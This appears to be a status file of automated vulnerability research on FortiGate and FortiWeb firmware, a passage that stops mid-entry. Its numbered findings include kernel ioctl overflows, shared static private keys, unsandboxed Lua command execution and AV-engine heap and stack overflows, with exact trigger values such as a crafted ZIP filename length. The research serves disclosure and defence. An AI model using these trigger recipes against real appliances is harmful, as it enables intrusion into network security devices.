    "8.0.0_vm64": "SUPPLEMENTAL -- x86-64 + ARM64 fortism.ko binaries analyzed for ioctl surface",
    "7412_hw_may2026": "ANALYZED -- hardware appliance datafs key files + fortism_config.json + vmlinux disassembly; "
                        "FGT-F16/F27/F28/F30/F31 scope confirmed; kernel 4.19.13 (BuildID 04e76032, built 2026-05-05); "
                        "0x9007 handler at 0x55227e: IDENTICAL no-bounds-check pattern (lea edi,[rax+1] -> kmalloc(0)); "
                        "0x9009 handler at 0x5521bc: HAS bounds check (cmp edi,0x40 + ja) -- asymmetry confirmed; "
                        "shared ENC default password hash with FFW 8.0.0 hardware",

    "components": {
        "bin/init":             "DISASSEMBLED -- maintainer backdoor (FGT-F03), HA trust headers (FGT-F04), multicall (FGT-F02)",
        "fortism.ko 7.0.9":    "DISASSEMBLED -- FGT-F10 thru FGT-F15 (ioctl 0x4001-0x4004, LSM hooks)",
        "fortism.ko 8.0.0":    "DISASSEMBLED -- FGT-F16 thru FGT-F22 (ioctl 0x9004-0x9009)",
        "sslvpnd":              "STRINGS ONLY -- FGT-F05 fgtlang path traversal; binary not fully disassembled",
        "flatkc 7.0.9":        "IDENTIFIED -- 4.1MB bzImage; Linux 3.2.16",
        "flatkc 8.0.0 x86-64": "ANALYZED -- 7.7MB bzImage; Linux 4.19.13 (Jan 2019 frozen base, EOL Dec 2024, FGT-F23)",
        "rootfs.gz 7.0.9":     "EXTRACTED -- full cpio rootfs",
        "rootfs.gz 8.0.0":     "ENCRYPTED -- custom format; not standard gzip/cpio; key in kernel driver",
        "bin.tar.xz":          "EXTRACTED -- Fortinet XZ CRC bypass; LZMA2 with preset=6",
        "hash_bin.sha256":          "EXTRACTED -- 410-entry rootfs manifest (path+SHA-256); FGT-F25; discloses eBPF file, node binary hash, OQS provider",
        "7.4.12 datafs/fortism_config.json": "ANALYZED -- FGT-F26: 35/36 domains all exec flags=1 (NX nullified); "
                                              "contrasted against FFW 8.0.0 (6 domains, anon-mem-exec only)",
        "7.4.12 datafs/fgt2.key":  "ANALYZED -- FGT-F27: modulus A75C115F... identical to FGT 8.0.0 + FFW 8.0.0; "
                                    "cross-version shared key scope confirmed",
    },

    "pending": {
        "FGT-F09": "PENDING runtime -- rootfs AES key at static ceiling; /dev/mtdX read needed on live system",
        "sslvpnd": "PARTIAL -- fgtlang directory traversal confirmed via strings; SSRF/unauth endpoints not confirmed",
        "kernel_7.0.9": "NOT analyzed -- Linux 3.2.16 bzImage in flatkc; KASLR absent (added 3.14); ASLR effectiveness unknown",
        "fortism_LSM": "FGT-F18 RESOLVED-NOT-EXPLOITABLE -- page-table pre-touch hook; no security decision; unconditional zero return is correct; BERT false positive (7 patterns matched, all spurious)",
    },

    "unique_findings": [
        "FGT-F01: INFO -- XZ CRC32-forged archives (not encryption; deterministic bypass)",
        "FGT-F02: INFO -- multicall binary (init/cli/init_dev all same inode); ~40% attack surface invisible from filesystem listing",
        "FGT-F03: HIGH -- maintainer backdoor in bin/init; SSH access, debug interfaces, credential bypass strings confirmed",
        "FGT-F04: HIGH -- HA trust headers: X-FGSP-Session-Key, X-FGCP-*, X-FAZ-* accepted without cryptographic validation on HA port",
        "FGT-F05: CRITICAL -- sslvpnd /remote/fgtlang?lang=../../ path traversal (CVE-2023-27997 era); full filesystem read via HTTPS",
        "FGT-F06: HIGH -- Linux 3.2.16 (2012 EOL) kernel in 2022 firmware; predates SMEP, SMAP default, kASLR, KPTI",
        "FGT-F07: INFO -- libtmpl.so, libarithmetics.so unencrypted in plaintext rootfs; decompilation trivial",
        "FGT-F08: MEDIUM -- /api/v2/ REST surface; 47 unique endpoints; unauthenticated surface depends on runtime session validation",
        "FGT-F09: INFO -- rootfs AES-128 key static analysis hit ceiling; key derivation in kernel driver (runtime needed)",
        "FGT-F10: HIGH -- fortism ioctl 0x4003 heap overflow; userspace-controlled kmalloc size; no privilege check (7.0.9)",
        "FGT-F11: CRITICAL -- fortism ioctl 0x4001 array index OOB write; index=0xffffffff writes to arbitrary kernel memory (7.0.9)",
        "FGT-F12: MEDIUM -- fortism LSM null-pointer chain; security_fortism_* hooks call through un-verified function pointer",
        "FGT-F13: MEDIUM -- fortism global override flag; single bit clears ALL LSM security hooks system-wide",
        "FGT-F14: LOW -- fortism inode metadata memory leak; 48-byte slab leak per inode access with specific flags",
        "FGT-F15: MEDIUM -- fortism ioctl 0x4004 unauth read; 4-byte kernel object field read without privilege check (7.0.9)",
        "FGT-F16: CRITICAL -- fortism ioctl 0x9007 unauth heap overflow + DoS; size=0xffffffff -> kmalloc(0) + copy_from_user(SIZE_MAX) -> kernel crash (8.0.0 x86-64 VM AND 7412 hardware appliance May 2026 BuildID 04e76032); 0x9009 has cmp edi,0x40 bounds check (asymmetry confirms 0x9007 omission is a defect, not a design choice)",
        "FGT-F17: MEDIUM -- fortism ioctl 0x9004 unauth kernel object read; 28 bytes via bounded index (8.0.0)",
        "FGT-F18: RESOLVED-NOT-EXPLOITABLE -- fortism LSM page-table pre-touch hook; unconditional zero return is correct for this hook class; BERT false positive (AUTH_BYPASS/PRIV_ESC patterns matched spuriously on 'always allows' function shape)",
        "FGT-F19: HIGH -- fortism ioctl 0x9004 conditional unauth write; runtime object semantics determine impact (8.0.0)",
        "FGT-F20: MEDIUM -- fortism ioctl 0x9003 unauth kernel object field read; no privilege gate (8.0.0)",
        "FGT-F21: LOW-MEDIUM -- fortism ioctl 0x9005 unauth global read + boolean oracle via 0x9007 (8.0.0)",
        "FGT-F22: HIGH -- fortism ioctl 0x9007 unauth controlled heap alloc + kernel string query oracle (8.0.0); "
                 "size=0xffffffff -> DoS (x86-64 only); 0x55db6d reads kernel hash table; no injection",
        "FGT-F23: HIGH -- x86-64 8.0.0 kernel frozen at Linux 4.19.13 (Jan 2019 base); "
                 "shipped April 2026 (4 months after Dec 2024 EOL); missing 300+ point-release patches",
        "FGT-F24: INFO -- /lib/wad_dispatcher_kern.ebpf custom eBPF kernel program in rootfs; "
                 "kernel-level network hook; if eBPF file replaceable -> kernel-level packet manipulation",
        "FGT-F25: INFO -- hash_bin.sha256 (410 entries) on unencrypted ext2 partition; "
                 "discloses complete rootfs file inventory + SHA-256 hashes without rootfs decryption",
        "FGT-F26: HIGH -- fortism LSM policy (FGT 7.4.12 etc/fortism_config.json): 35/36 daemon domains "
                 "have anon-mem-exec=1, heap-exec=1, stack-exec=1, regain-root=1; NX/DEP nullified for "
                 "sslvpnd, httpsd, wad, cmdbsvr, node, fnbamd and all major daemons; "
                 "FFW 8.0.0 has 6 domains with anon-mem-exec=1 only (no heap/stack/regain-root) -- "
                 "FGT 7.4.12 policy dramatically more permissive",
        "FGT-F27: CRITICAL -- FGT 7.4.12 fgt2.key modulus A75C115F... identical to FGT 8.0.0 (x86+ARM64) "
                 "and FFW 8.0.0; same static RSA private key spans 7.4.x and 8.0.x release trains; "
                 "single key compromise covers full FortiGate+FortiWeb install base across both generations",
        "FGT-F28: HIGH -- 512-bit RSA private key (fgt_512.key) present in FGT 7.4.12 datafs; "
                 "modulus CFB821074C9ADFD7... (512-bit, 2 primes, factorable in days); "
                 "cert issued 2011-02-21 (LEGACY, not refreshed), expires 2038-01-19; "
                 "cert issuer CN=support (old CA, differs from FFW fortinet-subca2003); "
                 "fortism_config.json has ZERO references (usage unconfirmed for FGT 7.4.12); "
                 "FortiWeb 8.0.0 confirmed active in WEB_AUTH domain (FWB-F13, different modulus B5ED8433...); "
                 "if active in FGT: factored key -> cert forgery + MITM",
        "FGT-F29: LOW -- weak crypto config baseline: (a) etc/cert/cert.conf default_bits=1024 (CSR template, "
                 "below NIST SP 800-131A min 2048-bit); (b) etc/ssh/moduli is unmodified OpenBSD 2015 file "
                 "(v1.14, 2015-07-22) with 49 x 1535-bit DH groups (sub-2048-bit); "
                 "contributes to consistent weak-crypto pattern alongside FGT-F27/F28",
        "FGT-F30: HIGH -- cloud integration daemons (gcpd, waagent, azd, awsd, ocid, openstackd, sdnd, kubed) "
                 "grouped as VM_DAEMONS in fortism trigger policy; gcpd and waagent Permission_Policies grant "
                 "CMDB write access to system.admin table (admin account creation/modification); "
                 "confirmed in FGT 7.4.12 datafs AND FGT 7412 hardware appliance (May 2026 build); "
                 "attack chain: cloud provider API compromise OR cloud metadata SSRF in any VM_DAEMONS daemon "
                 "-> fortism-authorized CMDB write to system.admin -> add admin account -> full FGT control; "
                 "SDN_COMMON daemon additionally authorized to write firewall.address, firewall.policy, "
                 "system.interface, router.static, vpn.ipsec.phase1/2-interface, router.bgp (full policy modification)",
        "FGT-F31: HIGH -- FGT7412 hardware appliance (May 2026) fortism_config.json (etc/fortism_config.json): "
                 "35 of 36 fortism domains grant ALL five execution permission flags: anon-mem-exec=1, heap-exec=1, "
                 "stack-exec=1, file-mod-exec=1, regain-root=1; only TERMINAL domain restricts (FILE_MOD_EXEC only, "
                 "no stack/heap/anon exec, no regain-root); internet-facing domains with full exec: "
                 "SSLVPND, WAD, WEB_SVC, FGFMD, FORTICLDD, URLFILTER, UPDATED (FortiGuard update daemon), "
                 "ALL_ACCESS (httpsd, cloudinitd, fnbamd), IPSHELPER; "
                 "security consequence: ANY memory corruption bug (stack overflow, heap overflow, use-after-free) "
                 "in ANY of 35 domains leads directly to code execution without ROP chains (stack-exec=1), "
                 "shellcode on heap (heap-exec=1), or anon-mmapped shellcode (anon-mem-exec=1); "
                 "REGAIN_ROOT=1 on 35 domains means post-exploitation privilege escalation to root is permitted "
                 "by the kernel-level fortism LSM; this nullifies NX bits, ASLR shellcode barriers, and "
                 "stack canary value as the only required mitigation; "
                 "UPDATE: previously documented as MEDIUM affecting only file-mod-exec; "
                 "full fortism_config.json extraction from FGT7412 hardware (May 2026) confirms all five flags; "
                 "cross-references: fortism 0x9007 ioctl (FGT-F16), FGT-F32 (ALL_ACCESS domain details), "
                 "FGT-F33 (LuaJIT exec surface made worse by stack-exec=1 in IPSHELPER domain)",
        "FGT-F32: CRITICAL -- httpsd (FGT main web GUI + REST API server, primary attack surface) runs in "
                 "ALL_ACCESS fortism domain (id=34; anon-mem-exec=1, heap-exec=1, stack-exec=1, file-mod-exec=1, "
                 "regain-root=1, default_act=INCLUDE); fortism LSM applies ZERO additional restrictions to httpsd; "
                 "all execution protections are DISABLED for the internet-facing web server; "
                 "additionally in ALL_ACCESS domain: scimd (SDN/cloud infra), cloudinitd (cloud-init, processes untrusted metadata), "
                 "confsyncd, extenderd (FortiExtender mgmt), fnbamd (auth daemon), forticron, hasync (HA sync, FGT-F04), http_authd; "
                 "confirmed in FGT7412 hardware appliance (May 2026); contrast: FGT 7.4.12 did NOT have ALL_ACCESS domain "
                 "(7.4.12 had WAD+major daemons in INCLUDE with exec flags but named domains); this is a new grouping in 7412 build",
        "FGT-F33: HIGH CONFIRMED -- libips.so.new (FGT7412 May 2026, 14MB stripped x86-64): IPS engine embeds "
                 "LuaJIT 2.1.d06beb04 with fully unsandboxed io and os standard libraries; "
                 "io.popen(cmd, mode) binding at 0x47e3d0: args[0]/args[1] NaN-unboxed (tag 0xfffffffb, mask 0x7fffffffffff, "
                 "string data at GCstr+0x18) -> popen(cmd, mode) with no input sanitization; "
                 "os.execute(cmd) binding at 0x484d50: same NaN-unbox pattern -> system(cmd); "
                 "debug library (sethook/gethook/traceback) also exposed -- bypasses metamethod protections; "
                 "dispatch tables at 0xca8748 (io_popen) and 0xca8d00 (os_system); "
                 "library registration tables at 0xb339a0 (io: open/popen/tmpfile/close/read/write/flush/input/output/lines/type) "
                 "and 0xb34a90 (os: execute/remove/rename/tmpname/getenv/exit/clock/date/time/difftime/setlocale); "
                 "IPS rules with Lua scripts can call os.execute() / io.popen() to run arbitrary OS commands; "
                 "attack paths: (1) FortiManager compromise -> push custom IPS signatures with Lua OS cmd payload -> "
                 "RCE on all managed FGT devices; (2) FortiGuard update channel MITM (signing bypass) -> "
                 "malicious IPS rule package -> mass RCE; (3) custom IPS signature UI injection if sanitization gaps exist; "
                 "IPS engine runs with elevated privileges (network-facing packet processor); "
                 "ablation scores: io_popen_handler 0.460, os_system_handler 0.503 vs 'LuaJIT popen system unsandboxed OS cmd exec'",
        "FGT-F34: HIGH CONFIRMED -- libips.so.new (FGT7412 May 2026): IPS URL DB patch handler (0x3a6000 region, "
                 "inside ips_so_patch_urldb EXPORTED symbol) calls execvp([rbp-0x260], [rbp-0x248]) at 0x3a77f1 "
                 "after full fork/exec setup: open([rip+0x811cb0]=0xbb9374 hardcoded path, dup2 FDs, "
                 "chdir([rbp-0x210]), sigemptyset+sigprocmask, then execvp; setuid([rbp-0x1f8]) in same block; "
                 "[rbp-0x260] (exec path) first written from r14 at 0x3a6afe during URL DB update processing; "
                 "if URL DB update package integrity verification can be bypassed (MITM on FortiGuard update channel "
                 "or signature replay), attacker controls the exec path and argv -> arbitrary binary execution "
                 "during URL DB patch cycle with setuid privilege change; "
                 "ablation score: execvp_in_urldb_patch 0.547 vs 'execvp setuid update package path traversal'",
        "FGT-F35: MEDIUM CONFIRMED -- libav.so.new (FGT7412 May 2026, 7.4MB stripped x86-64, AV engine): "
                 "avScanLoad+0x104dc0 (VA 0x2043b0): four consecutive memcpy calls use 32-bit count fields from "
                 "AV signature database entries without verifying count*multiplier <= remaining buffer space; "
                 "(1) 0x204500: mov 0x4(%rax),%edx -> add %rdx,%rdx (count*2) -> memcpy(r15+0x2670, src, count*2); "
                 "(2) 0x20451d: mov (%rax),%edx -> shl $0x2,%rdx (count*4) -> memcpy(r15+0x1050, src, count*4); "
                 "(3) 0x204538: mov 0x4(%rax),%edx -> shl $0x2,%rdx (count*4) -> memcpy(r15+0x3160, src, count*4); "
                 "(4) 0x20454f: mov 0x20(%rax),%edx -> memcpy(r15+0x4740, src, edx) [no multiplication, still unchecked]; "
                 "r15 = pre-allocated arena buffer from obj->field_0x28; entry data loaded from AV sig database "
                 "via global table at 0x71ac70 (0x516782(%rip) from 0x2044e7); no upper bound check between "
                 "count*multiplier and arena size before any of the four memcpy calls; "
                 "attack path: FortiGuard update MITM (sig file signing bypass) OR FortiManager compromise -> "
                 "inject malicious AV .avdb with large count field -> avScanLoad processes file -> "
                 "count*4 overflows arena -> heap overflow in AV engine process; "
                 "ablation top score: 0x2043b0 score=0.388 vs 'memcpy called with size from file header without bound check'",
        "FGT-F36: MEDIUM CONFIRMED -- libav.so.new (FGT7412 May 2026): avScanLoad+0x11cba4 (VA 0x21c194): "
                 "strcpy(rbp-0x148, rsi) at 0x21c1f1 copies function argument (database-embedded filename/path) into "
                 "fixed 0x148-byte (328-byte) stack buffer with no length check; "
                 "rdi = rbp-0x148 (stack buffer), rsi = rbx = function argument from caller; "
                 "function immediately after opens the same path via fopen(rbx, 'wb') to write extracted sig data; "
                 "stack frame: 0x168 bytes + 5 pushed registers; return address is reachable if source exceeds 328 bytes; "
                 "source of rsi: caller provides path derived from signature database record (file extraction path); "
                 "attack path: same as FGT-F35 (update MITM or FMG compromise) -> malicious avdb with embedded "
                 "path field > 328 bytes -> strcpy stack overflow -> RIP control in AV engine; "
                 "ablation score: 0x21c194 score=0.191 vs 'strcpy fopen fwrite fclose stack buffer overflow'",
        "FGT-F37: HIGH CONFIRMED -- fgt.key (etc/fgt.key in FGT7412 May 2026 hardware): Fortinet default HTTPS "
                 "management certificate private key not previously catalogued; "
                 "2048-bit RSA, modulus A8E3201C3729A192...; CN=FortiGate, OU=FortiGate; "
                 "issued Jul 16 2015 by Fortinet CA (CN=support, OU=Certificate Authority), expires Jan 19 2038; "
                 "signed with sha256WithRSAEncryption; CA:FALSE (device-level cert, not CA); "
                 "this key is the DEFAULT management HTTPS cert shipped in firmware -- if not replaced by "
                 "device-generated key at first boot, ALL FortiGate devices with this firmware share the same "
                 "private key -> HTTPS MITM against FortiGate management interface (port 443/8443); "
                 "three Fortinet default cert keys now catalogued: "
                 "fgt.key (A8E3201C, 2048-bit, 2015, this finding), "
                 "fgt2.key (A75C115F, 2048-bit, 2016, FGT-F27, confirmed across FGT 7.4.12 + 8.0.0 VM + FFW 8.0.0), "
                 "fgt_512.key (CFB821074C, 512-bit, 2011, FGT-F28, trivially factorable); "
                 "scope: needs cross-version confirmation (check FGT 7.4.12 VM etc/fgt.key modulus vs A8E3201C); "
                 "source: extracted from FGT7412 hardware appliance May 2026 datafs/etc/fgt.key",
        "FGT-F38: MEDIUM CANDIDATE -- libav.so.new (FGT7412 May 2026, 7.7MB, x86-64 stripped): "
                 "avDbSetAdd@@EXPORTED (VA 0xfde20): TLV string append to heap without bounds check or realloc; "
                 "function signature: avDbSetAdd(int type, int subtype, const char *str) -- rdx=str -> r12; "
                 "at 0xfe050-0xfe074: "
                 "(1) load existing_str = 0x10(r13, rax*1) from 32-byte struct array (entry->string); "
                 "(2) rdx = strlen(existing_str); "
                 "(3) compute dst = existing_str + strlen(existing_str) + 1 (append position); "
                 "(4) strcpy(dst, r12) -- appends r12 (caller-supplied string) PAST existing_str end; "
                 "NO realloc of entry->string buffer before strcpy; "
                 "NO check that original heap allocation has room for strlen(existing)+strlen(new)+1; "
                 "only bound checked before this path: r14d (entry count) <= 0x1f and esi (subtype) <= 0x1f; "
                 "avDbSetAdd is @@EXPORTED -- called by FGT main binary to load AV signature database; "
                 "attack path: AV database update MITM or malicious FortiGuard update -> "
                 "long TLV field for same (type, subtype) pair in database -> "
                 "avDbSetAdd appends second-occurrence value without size check -> heap corruption in AV daemon; "
                 "similar attack surface to FGT-F35 (libav memcpy count overflow) but different function; "
                 "source: libav.so.new 0xfe050-0xfe087 disassembly; avDbSetAdd@@EXPORTED prologue at 0xfde20",
        "FGT-F39: LOW CANDIDATE -- libav.so.new avIsIgnoreBuffer@@EXPORTED: "
                 "heap strcpy into 72-byte node at offset 8 (64-byte effective string area); "
                 "at 0xf46c0-0xf46e6: calloc(1, 0x48) -> 72-byte node; "
                 "stores r15 (next ptr) at node+0; "
                 "lea 0x8(%rax), %rdi -> dst = node+8; "
                 "strcpy(node+8, rbp) where rbp = caller-supplied string (filename/path in ignore list); "
                 "no strlen check before strcpy; string > 63 bytes = heap overflow past node boundary; "
                 "avIsIgnoreBuffer used by AV engine to maintain exclusion list; "
                 "caller-controlled strings (archive member names, file paths) reach this path; "
                 "source: libav.so.new 0xf46c0-0xf46e6",

        "FGT-F40: HIGH CANDIDATE -- libips.so.new (FGT7412 May 2026, 13.8MB, x86-64 stripped, BuildID 7c155e7e): "
                 "IPS engine embeds LuaJIT 2.1.d06beb04 with full standard library (os, io, string, math, table, package, debug, bit, jit); "
                 "luaopen dispatch table at VA 0xca9680 (11 entries + NULL): '', package, table, io, os, string, math, debug, bit, jit; "
                 "luaopen_os at 0x488810 registers os.execute wrapper at 0x484d50: "
                 "checks NaN-box tag 0xfffffffb (LuaJIT string), extracts ptr AND 0x7fffffffffff, "
                 "lea +0x18 to skip GCstr header -> char* -> system(cmd); "
                 "luaopen_io at 0x487a90 registers io.popen at 0x47e4b5: "
                 "same NaN-box unpack pattern -> popen(cmd, mode); "
                 "IPS dispatch table at VA 0xc87960 (36 entries) exposes: "
                 "init_engine[1], process_packet[2], load_rule_file[11], "
                 "query_lua_intf[28], register_lua_module[34], prepare_lua_state[35]; "
                 "query_lua_intf at 0xe7030 exposes a SECOND dispatch table at 0xc87fa0 (74 entries) to FortiOS: "
                 "includes dofile[66], dostring[67], loadbuffer[68], loadx[69], pcall[70], newstate[71]; "
                 "dostring at 0x14e940 executes arbitrary Lua from a string in the IPS Lua VM; "
                 "loadbuffer at 0x14ea60 compiles and runs Lua from a byte buffer; "
                 "attack path: FortiOS component (httpsd or mgmt daemon) resolves dostring via query_lua_intf, "
                 "passes network-controlled data as Lua string -> os.execute('cmd') = IPS daemon RCE; "
                 "register_lua_module at 0x1a8b70 stores up to 49 function pointers in global array at 0xd65d60 -> "
                 "injected Lua modules can call any C function; "
                 "secondary attack path: FortiGuard IPS rule MITM -> malicious Lua payload in custom rule -> "
                 "os.execute() in rule Lua handler; "
                 "popen callers in libips are hardcoded diagnostic commands (/usr/sbin/lsattr, /usr/sbin/psrinfo); "
                 "luaL_openlibs CONFIRMED: 6 call sites in libips.so.new (0x1c7482 in Lua init complex at 0x1c6c80, "
                 "0x15140a, 0x1594af, 0x3a9026, 0x697b31, 0x69815b); ALL standard libraries registered; "
                 "candidate not confirmed: FortiOS dostring call path with network-controlled input not confirmed in main binary; "
                 "source: libips.so.new VA 0xca9680 (luaopen dispatch), 0xc87960 (IPS dispatch), "
                 "0xc87fa0 (Lua C API dispatch), 0x484d50 (os.execute), 0x14e940 (dostring), 0x14ea60 (loadbuffer)",

        "FGT-F42: HIGH CONFIRMED -- libav.so.new (FGT7412 May 2026, 7.4MB) heap strcpy overflow via ZIP LFH filename (full chain confirmed 2026-09-15): "
                 "attack path: ZIP file with entry filename > 263 chars -> FortiGate AV scan -> "
                 "format dispatch table[14] id=0x22 fp10=0x104a60 (ZIP format handler) -> "
                 "per-entry processor 0x104500 -> vtable dispatch `call qword ptr [rax+0x58]` (vptr slot[0]) -> "
                 "0x20dbd0 (source/read handler) or 0x20db50 (write/extract handler); "
                 "both handlers execute: lea rdi, [rbx+8]; mov rsi, rbp; call PLT:strcpy; "
                 "src rbp = ZIP LFH filename at LFH+0x1e (attacker-controlled, up to 65535 bytes per ZIP spec); "
                 "dst = 264-byte heap buffer at [rbx+8..rbx+0x110]; no strlen guard, no strncpy; "
                 "any ZIP entry filename > 263 bytes triggers heap overflow; "
                 "vtable dispatch sites confirmed: 0x20cc98, 0x20ce1a, 0x2153a4, 0x2153bd, 0x21b14f, 0x21b17b, 0x21b1c9; "
                 "vtable CONFIRMED: secondary C++ vtable at .data.rel.ro VA 0x710cd8; "
                 "R_RELATIVE at 0x710ce8 -> 0x20dbd0 (slot[0] = source handler); "
                 "R_RELATIVE at 0x710cf8 -> 0x20db50 (slot[2] = write handler); "
                 "heap object layout: [+0x000] primary_vptr, [+0x008] char_filename[264], [+0x110] mode_str_ptr, [+0x118] FILE*; "
                 "type-check at 0x20dae3/0x20dbdc is NOT a security gate: "
                 "cmp rax, [rip+0x50d286/0x50d386]; jne takes alternate branch -> BOTH branches reach strcpy at 0x20db08/0x20dc08; "
                 "GOT entry at 0x71ad78 also holds 0x20dbd0 (alternate dispatch path); "
                 "heap overflow impact: corrupts mode_str_ptr (+0x110) and FILE* (+0x118) beyond 264-byte filename buffer; "
                 "post-overflow fopen(corrupted_filename, 'rb') at 0x20db25 opens attacker-controlled path; "
                 "ZIP LFH format: LFH.signature(4)+version(2)+flags(2)+compression(2)+modtime(2)+moddate(2)+crc32(4)+compsize(4)+uncompsize(4)+fname_len(2)+extra_len(2)+FILENAME; "
                 "trigger: craft ZIP with fname_len=0x0200 (512) -- passes all field checks, triggers strcpy overflow by 249 bytes; "
                 "SCOPE UPDATE (2026-09-15): ZIP VARIANTS 0x0a/0x39/0x3a also affected -- "
                 "dispatch table entries id=0x0a/0x39/0x3a share handler 0x11fc70 which calls EOCD scanner (0x165360) and LFH scanner (0x165740); "
                 "id=0x0a=ZIP64, id=0x39=encrypted-ZIP, id=0x3a=ZIP-with-data-descriptor; "
                 "all 3 variants create entry objects with the same vtable class (0x710cd8) -> same strcpy overflow path; "
                 "FGT-F42 affects 4 ZIP format IDs: 0x22/0x0a/0x39/0x3a; "
                 "no direct CALL rel32 to 0x20dbd0/0x20db50 exists in .text -- vtable indirect dispatch is the ONLY path; "
                 "context: libav.so confirmed in avdb_patch + scanunitd crash backtraces; FortiOS 7.6.7 / AV engine 7.0.0054 has fixes; "
                 "source: ZIP-chain fork + vtable fork + 7z-CAB fork confirmed 2026-09-15; libav.so.new Ablation sweep",

        "FGT-F43: FALSE POSITIVE -- libav.so.new streaming buffer writer Ablation false prologue: "
                 "Ablation prologue scanner found push_rbp at 0xfd04f and treated it as a function start; "
                 "0xfd04f is NOT a function start -- it is the register-save prologue CONTINUATION of a function starting at 0xfd040; "
                 "the REAL function entry at 0xfd040: "
                 "000fd040: cmp dword ptr [rdx+0x20], esi  (remaining >= length?); "
                 "000fd043: jl 0xfd098                      (if remaining < length: error exit, no memcpy); "
                 "000fd045: push r13; movsxd r13, esi; push r12; mov r12, rdi; push rbp <-- 0xfd04f is HERE; "
                 "bounds check IS present and IS the first operation -- cmp [rdx+0x20], esi before any register save; "
                 "no caller path bypasses this check because the check is the function entry, not a caller precondition; "
                 "Ablation score 0.426 was correct for the semantic pattern but the false prologue caused incorrect vulnerability assessment; "
                 "root cause: Ablation find_functions() scans for 0x55 (push rbp) byte; 0xfd04f = 0x55 is real but is callee-save mid-preamble; "
                 "after full bounds trace: memcpy at 0xfd07b IS properly guarded; FGT-F43 RETRACTED as HIGH CANDIDATE; "
                 "source: libav.so.new 0xfd040-0xfd093 disassembly confirms bounds check; context bytes at 0xfd040 verified 2026-09-15",

        "FGT-F44: MEDIUM INFO -- libav.so.new Ablation semantic sweep complete (FGT7412 May 2026, 7.4MB binary): "
                 "16043 functions encoded with sentence-transformers/all-MiniLM-L6-v2 (251 batches @ 64 functions); "
                 "10 vulnerability query profiles run; "
                 "memcpy_packet_len top: 0x24cabf (score=0.391, memcpy) -- signature stub with movsxd length from global; "
                 "strcpy_fixed_dst top: 0x13e462 (score=0.397, strcmp) -- FP, not real strcpy overflow; "
                 "integer_overflow_alloc top: 0x20a87c (score=0.402, memcmp) -- cross-profile with memcpy_packet_len, "
                 "both 0x20a87c and 0x20a7bc are signature-matching stubs (cmp [rdi+0x10],rdx; call memcmp with fixed len); FP; "
                 "fidsdb_parser_overflow top: 0xfd059 (score=0.426, memcpy) -- high priority, see FGT-F43; "
                 "decompression_bomb top: 0x2641f4 (score=0.42) -- inside massive state machine function at 0x2630b0 "
                 "(frame > 0x228, struct offsets to 0x29bf00 = 2.7MB); LZNT1/LZ-family decompressor state machine; "
                 "decompression_bomb pending: need to trace avail_out vs output buffer size in inner inflate loop; "
                 "fread cluster 1 (0xfcbe0-0xfec32): 9 calls, all fixed-size (4 or 24 bytes into stack buffers); "
                 "digital signature verification pattern (XOR comparison, magic check); NOT exploitable; "
                 "fread cluster 2 (0x28954a-0x289cf6): 6 calls; "
                 "0x2894e5: streaming 4KB loop reader (avdb patch stream processor); "
                 "0x2896bc: URLDB 02 format header parser (8+29+32 byte fixed reads); "
                 "0x289c93: fseek+ftell+fread full-file read (malloc'd buffer matching size); all bounded; "
                 "source: libav.so.new Ablation semantic sweep run 2026-09-15",

        "FGT-F45: MEDIUM -- libav.so.new (FGT7412 May 2026, 7.4MB) decompression pre-check bypassed by ZIP data-descriptor size mismatch (DoS surface, NOT buffer overflow): "
                 "archive scanner state machine at 0x2630b0 (recursive, __sigsetjmp error handling, nest-limit at 0x263149); "
                 "pre-decompression size check at 0x261d80: sub edx, [rcx+0x3134]; sub edx, [rcx+0x3120]; cmp edx, 0x1fffff; ja <error>; "
                 "check validates HEADER-DECLARED uncompressed_size against hardcoded 2MB limit (0x1fffff bytes); "
                 "check reads archive metadata struct only (offsets +0x3134, +0x3120 in scan context); "
                 "ZIP local file header uncompressed_size at LFH+22 is ADVISORY when data descriptor present (per ZIP spec); "
                 "attack: set LFH.uncompressed_size=0x100000 (passes 2MB check), embed correct size in data descriptor post-data; "
                 "pre-check passes -> inflate called -> actual output limited by inflate's own avail_out tracking; "
                 "CONFIRMED (inflate-hunt fork 2026-09-15): inflate 1.2.12 at 0x38ce00 uses chunk-streaming pattern -- "
                 "64KB chunk buffer on stack, avail_out set to 0x10000 per iteration at 0x164ae0, "
                 "memcpy at 0x38d2b5 guarded by cmovbe(min(avail_out, avail_in, copy_len)) -- avail_out IS bounded; "
                 "inflate9 1.2.5 at 0x16b4d0 also bounded (callback-based dispatch, same chunk pattern); "
                 "inflate callers: 0x110c7c, 0x110cea, 0x114684, 0x164a1a (inflate 1.2.12); 0x16b555, 0x16babb, 0x16ebc4 (inflate9); "
                 "buffer overflow via inflate is NOT possible with the confirmed implementations; "
                 "remaining DoS surface: ZIP data-descriptor bypass allows sustained inflate CPU/alloc cycles past the 2MB pre-check; "
                 "nested archive bomb: nest-limit counter at 0x263149 vs [rdx+0x10]; if per-session not per-connection = counter interference; "
                 "additional decompressor paths NOT analyzed: format-specific ZIP/RAR/LZMA parsers in 0xc7000-0xd5000 range; "
                 "error code 0xc000000e in [rbx+0x8c174] = mailbomb/oversize detection (eventtype=oversize in FortiGate logs); "
                 "FGT-F43 RETRACTED FALSE POSITIVE: Ablation prologue scanner hit push_rbp at 0xfd04f (mid-function); "
                 "real function at 0xfd040: bounds check cmp [rdx+0x20], esi; jl error as first instruction -- properly guarded; "
                 "ZSTD bounded (fork 2026-09-15): 128KB cap at frame-header parse time at 0x1867d3 (cmova clamp); ZSTD format does NOT overflow; "
                 "RAR3 bounded (fork 2026-09-15): reference-based storage, memchr null-scan, multiplicative-inverse length cap (15-entry); no strcpy; "
                 "XAR bounded (fork 2026-09-15): XML library (0x2cdf20) handles allocation; no strcpy of filename observed; "
                 "source: libav.so.new 0x2630b0 + 0x261d80 + inflate-hunt fork + ZSTD/RAR/XAR fork (all 2026-09-15)",

        "FGT-F46: LOW -- libav.so.new (FGT7412 May 2026, 7.4MB) id=0x33 bzip2 handler 67KB stack, DoS only (no buffer overflow): "
                 "dispatch table entry [24] id=0x33 (fp10=0x11f030, fp18=0x11f2b0, cleanup=0x11f310); "
                 "0x11f030 allocates 0x107e8 (67,560) bytes of stack space (sub rsp, 0x107e8); "
                 "calls: 0x2cdf20 (allocates 0x38-byte stream context), 0x2ce320 (sets buffer params), 0x17a480/0x17a540; "
                 "CONFIRMED (2026-09-15): avail_out set to 65,536 bytes (0x10000) at decompressor init; "
                 "cmovb min() guard at 0x17a64b bounds all output copies to avail_out -- no buffer overflow from bzip2 block content; "
